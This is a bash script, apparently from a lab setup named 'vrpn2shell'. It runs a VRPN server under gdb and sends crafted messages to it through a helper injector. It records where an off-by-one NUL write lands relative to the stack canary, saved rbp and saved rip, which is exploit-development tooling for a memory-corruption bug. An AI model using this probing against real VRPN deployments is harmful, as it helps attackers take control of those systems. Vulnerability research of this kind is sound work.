#!/usr/bin/env bash
# Plain (no-ASan) build: observe the NUL write relative to saved rbp/rip.
# Env overrides: BIN=<server> LINE_PRE=<write line> LINE_POST=<after write>
# VAR=<name array symbol> MSGTYPE=<VRPN message type integer>
OUT=${1:?usage: probe-plain-rip.sh <outdir> <port> <index>}
PORT=${2:?port required}
IDX=${3:?index required}
BIN=${BIN:-lab/frontier/vrpn2shell/build-plain-07.36/server_src/vrpn_server}
LINE_PRE=${LINE_PRE:-4554}
LINE_POST=${LINE_POST:-4556}
VAR=${VAR:-sender_name}
MSGTYPE=${MSGTYPE:--1}
mkdir -p "$OUT"
cat >"$OUT/gdb.cmd" <<EOF
set pagination off
set confirm off
break vrpn_Connection.C:$LINE_PRE
commands
silent
printf "PRE i=%d dest=%p canary=%p saved_rbp=%p saved_rip=%p\\n", i, &$VAR[i], *(void**)((char*)&$VAR+104), *(void**)((char*)&$VAR+112), *(void**)((char*)&$VAR+120)
continue
end
break vrpn_Connection.C:$LINE_POST
commands
silent
printf "POST i=%d dest=%p canary=%p saved_rbp=%p saved_rip=%p\\n", i, &$VAR[i], *(void**)((char*)&$VAR+104), *(void**)((char*)&$VAR+112), *(void**)((char*)&$VAR+120)
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$OUT/gdb.cmd" \
  --args $BIN \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 2
python3 lab/frontier/vrpn2shell/wire_inject.py --index "$IDX" --port "$PORT" --msgtype "$MSGTYPE" \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== client"; cat "$OUT/client.txt"
echo "=== gdb key lines"; grep -E 'PRE |POST |SIGSEGV|SIGILL|SIGABRT|Program received|instruction address|0x|vrpn_Connection.C:45' "$OUT/gdb.log" | head -40
